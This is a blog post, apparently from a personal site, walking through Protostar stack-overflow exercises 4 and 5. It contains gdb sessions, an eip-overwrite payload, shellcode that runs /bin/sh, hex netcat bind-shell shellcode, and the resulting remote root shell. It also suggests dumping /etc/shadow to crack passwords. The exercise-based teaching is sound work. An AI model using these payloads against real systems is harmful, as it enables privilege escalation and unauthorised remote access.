@@ -1,0 +1,370 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Protostar Stack Exploits (Solutions 4-5) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="
+
+
+
+
+
+	Protostar Stack Exploits (Solutions 4-5)
+        Buffer overflow exploit exercises, part two. 
+	Overview
+Protostar is a series of exercises ...">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta property="fb:admins" content="100001696373537" />
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/24/protostar-stack1/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+        <script type="text/javascript"
+            src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+          </script>
+	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="https://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-5225926150102880",
+          enable_page_level_ads: true
+     });
+</script>
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script type="text/javascript">
+		$(function(){
+                    $('.profilepic').append("<img src='https://www.gravatar.com/avatar/" + "9f050cf96c6cc933141f0242e5b723fd" + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/categories/projects">Sideprojects</a></li>
+  <li><a href="/publications">Publications</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="mailto:pong@outlook.com">Contact</a></li>
+</ul>
+
+
+<section class="aboutme">
+  <p>
+    Harvard student and developer.
+  </p>
+</section>
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			<div class="mid-col-container">
+				<div id="content" class="inner"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Github top leaderboard -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5225926150102880"
+     data-ad-slot="1340213627"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Protostar Stack Exploits (Solutions 4-5)</h1>
+        <h3 class="subtitle" itemprop="subtitle">Buffer overflow exploit exercises, part two. </h3>
+	<div class="entry-content" itemprop="articleBody"><h1 id="overview">Overview</h1>
+<p><strong>Protostar</strong> is a series of exercises from <a href="http://exploit-exercises.com/protostar">Exploit Exercises</a>. In addition to three final levels, it has four basic sections: network programming, format strings, heap overflows, and stack overflows.</p>
+
+<p>This series of posts contains solutions and walkthroughs for the stack overflow levels (“Stack”). It assumes basic knowledge of systems programming and is meant to serve as a reference for those stuck on certain levels. This is the second of three posts for Stack.</p>
+
+<h1 id="solutions">Solutions</h1>
+<h2 id="stack-level-4">Stack: Level 4</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack4">full</a>): Overwrite the <a href="http://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">eip register</a> to change execution flow.</p>
+
+<p>First, we want to find the offset to the return address. We can explore using gdb and a breakpoint on <code class="language-plaintext highlighter-rouge">main</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gdb ./stack4</code></pre></figure>
+
+<!-- more -->
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">(gdb) break main
+Breakpoint 1 at 0x8048411: file stack4/stack4.c, line 15.
+(gdb) run
+Starting program: /opt/protostar/bin/stack4
+
+Breakpoint 1, main (argc=1, argv=0xbffff874) at stack4/stack4.c:15
+15      stack4/stack4.c: No such file or directory.
+in stack4/stack4.c
+(gdb) next
+AAAA
+16      in stack4/stack4.c
+(gdb) info frame
+Stack level 0, frame at 0xbffff7d0:
+eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eacc76
+source language c.
+Arglist at 0xbffff7c8, args: argc=1, argv=0xbffff874
+Locals at 0xbffff7c8, Previous frame's sp is 0xbffff7d0
+Saved registers:
+ebp at 0xbffff7c8, eip at 0xbffff7cc
+(gdb) x/32xw $esp
+0xbffff770:     0xbffff780      0xb7ec5165      0xbffff788      0xb7eaca75
+0xbffff780:     0x41414141      0x08049500      0xbffff798      0x080482e8
+0xbffff790:     0xb7ff1040      0x080495ec      0xbffff7c8      0x08048449
+0xbffff7a0:     0xb7fd7304      0xb7fd6ff4      0x08048430      0xbffff7c8
+0xbffff7b0:     0xb7ec5365      0xb7ff1040      0x0804843b      0xb7fd6ff4
+0xbffff7c0:     0x08048430      0x00000000      0xbffff848      0xb7eacc76
+0xbffff7d0:     0x00000001      0xbffff874      0xbffff87c      0xb7fe1848
+0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x0804824b
+(gdb) p 0xbffff7cc - 0xbffff780
+= 76
+(gdb) info address win
+Symbol "win" is a function at address 0x80483f4.</code></pre></figure>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">info frame</code>: Shows the normal location of the saved instruction pointer, <code class="language-plaintext highlighter-rouge">eip</code>: <code class="language-plaintext highlighter-rouge">0xb7eacc76</code>.</li>
+  <li><code class="language-plaintext highlighter-rouge">x/32xw $esp</code>: Examines the current stack frame. The buffer starts at <code class="language-plaintext highlighter-rouge">0xbffff780</code> with <code class="language-plaintext highlighter-rouge">0x414141</code> (AAAA).</li>
+  <li><code class="language-plaintext highlighter-rouge">p 0xbffff7cc - 0xbffff780</code>: Calculates <code class="language-plaintext highlighter-rouge">&amp;eip - &amp;buffer</code>, giving an offset to eip.
+Using the offset calculated above, <code class="language-plaintext highlighter-rouge">eip</code> is redirected to the address of <code class="language-plaintext highlighter-rouge">win()</code> function.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="si">$(</span>perl <span class="nt">-e</span> <span class="s2">"print 'A'x76"</span><span class="si">)</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08"</span> | ./stack4
+<span class="go">code flow successfully changed
+Segmentation fault</span></code></pre></figure>
+
+<h2 id="stack-level-5">Stack: Level 5</h2>
+<p><strong>Description</strong> (<a href="http://exploit-exercises.com/protostar/stack5">full</a>): Use buffer overflow to execute shellcode on a suid root program, <code class="language-plaintext highlighter-rouge">stack5</code>.</p>
+
+<h3 id="utilities">Utilities</h3>
+
+<p><code class="language-plaintext highlighter-rouge">~/nop</code>:</p>
+
+<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="c1">#!/usr/bin/perl</span>
+<span class="c1"># Prints argv[0] number of NOP instructions to stdout</span>
+<span class="k">print</span> <span class="p">"</span><span class="se">\x90</span><span class="p">"</span><span class="nv">x$ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">~/envaddr.c</code>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Prints the approximate address of an environmental variable</span>
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">addr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s not found</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s is at address %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+    <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>These utilities will be used in future solutions as well.</p>
+
+<h3 id="solution">Solution</h3>
+
+<h4 id="overview-1">Overview</h4>
+<p>From a high level, this is our approach:</p>
+<ol>
+  <li>Store the shellcode in an environmental variable.</li>
+  <li>Find the approximate address of the environmental variable on the stack.</li>
+  <li>Overwriting the return address in <code class="language-plaintext highlighter-rouge">stack5</code> with the address of the environmental variable, we execute the shellcode.</li>
+</ol>
+
+<p>There are various ways to execute shellcode, but it’s more reliable to keep the shellcode in an environmental variable rather than the buffer in case it’s larger than the buffer (64 bytes).</p>
+
+<h4 id="executing-binsh">Executing <code class="language-plaintext highlighter-rouge">/bin/sh</code></h4>
+<p>The shellcode is a modified version of the code from <em>Hacking: The Art of Exploitation</em>. It runs the command <code class="language-plaintext highlighter-rouge">/bin//sh -sli</code>.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>
+
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="mh">0x68732f2f</span>   <span class="c1">; chars for /bin//sh</span>
+<span class="nf">push</span> <span class="mh">0x6e69622f</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
+
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="mh">0x736c692d</span>   <span class="c1">; -sli flags</span>
+<span class="nf">push</span> <span class="nb">eax</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
+<span class="nf">int</span> <span class="mh">0x80</span></code></pre></figure>
+
+<p>We’ll overwrite the return address with the address of our shellcode environmental variable.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>~/nop 100<span class="si">)$(</span><span class="nb">cat</span> /home/user/shell<span class="si">))</span>
+<span class="gp">$</span><span class="w"> </span>~/envaddr SC
+<span class="go">SC is at address 0xbffffefa
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xfa\xfe\xff\xbf"x25'</span><span class="si">)</span> | /opt/protostar/bin/stack5</code></pre></figure>
+
+<p>Nothing happened! Let’s take a look with GDB.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[user@protostar:~]$ echo -n $(perl -e 'print "\xfa\xfe\xff\xbf"x25') &gt; /tmp/sc-shell
+[user@protostar:~]$ gdb /opt/protostar/bin/stack5
+Reading symbols from /opt/protostar/bin/stack5...done.
+(gdb) run &lt; /tmp/sc-shell
+Starting program: /opt/protostar/bin/stack5 &lt; /tmp/sc-shell
+Executing new program: /bin/dash
+
+Program exited normally.</code></pre></figure>
+
+<p>The shell opens, but it exits immediately. The shellcode is executing, but there’s another issue: as documented <a href="http://stackoverflow.com/questions/10767070/buffer-overflow-program-terminates-after-spawning-a-shell">here</a> and <a href="http://forums.freebsd.org/showthread.php?t=10054">here</a>, opening shells from stdin is problematic.</p>
+
+<h4 id="opening-a-shell-through-netcat">Opening a shell through netcat</h4>
+<p>We know that our shellcode does run, but it can’t open a shell. However, there are a wide a wide array of exploits available besides running <code class="language-plaintext highlighter-rouge">/bin/sh</code>. We could dump <a href="http://en.wikipedia.org/wiki//etc/shadow">/etc/shadow/</a> and use <a href="http://www.openwall.com/john/">John the Ripper</a> to crack the passwords. Another option is to open up a remote shell through <a href="http://linux.die.net/man/1/nc">netcat</a>. We’ll use the netcat solution.</p>
+
+<p>Using <a href="http://shell-storm.org/shellcode/files/shellcode-684.php">netcat shellcode</a>, we go through the same process <a href="https://gist.github.com/9e403a2889a07eeb84a9">(plaintext gist)</a>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">2a</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">19</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">23"</span> <span class="o">&gt;</span> ~/sc-nc-8080
+<span class="gp">$</span><span class="w"> </span><span class="nb">export </span><span class="nv">SC</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="si">$(</span>~/nop 100<span class="si">)$(</span><span class="nb">cat</span> /home/user/sc-nc-8080<span class="si">))</span>
+<span class="gp">$</span><span class="w"> </span>~/envaddr SC
+<span class="go">SC is at address 0xbffffece
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="si">$(</span>perl <span class="nt">-e</span> <span class="s1">'print "\xce\xfe\xff\xbf"x25'</span><span class="si">)</span> | /opt/protostar/bin/stack5
+<span class="gp">&lt;waiting&gt;</span></code></pre></figure>
+
+<p>On another machine, complete the newly waiting connection:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~]<span class="nv">$ </span>nc 192.168.1.10 8080
+<span class="go">whoami
+root</span></code></pre></figure>
+
+</div>
+
+</article>
+
+	<div class="share">
+  <!--AddThis Button BEGIN -->
+  <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
+    <a class="addthis_button_preferred_1"></a>
+    <a class="addthis_button_preferred_2"></a>
+    <a class="addthis_button_preferred_3"></a>
+    <a class="addthis_button_preferred_4"></a>
+    <a class="addthis_button_compact"></a>
+    <a class="addthis_counter addthis_bubble_style"></a>
+  </div>
+  <script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51e5a5762f46bbe9"></script>
+  <!-- AddThis Button END -->
+</div>
+
+
+
+<script async
+  src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Github bottom leaderboard -->
+<ins class="adsbygoogle"
+       style="display:block"
+            data-ad-client="ca-pub-5225926150102880"
+                 data-ad-slot="1968553857"
+                      data-ad-format="auto"
+                           data-full-width-responsive="true"></ins>
+  <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2020 - Louis Li
+</p>
+
+Theme originally by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
+</footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'llgithub';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/24/protostar-stack1/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/24/protostar-stack1/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'https://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
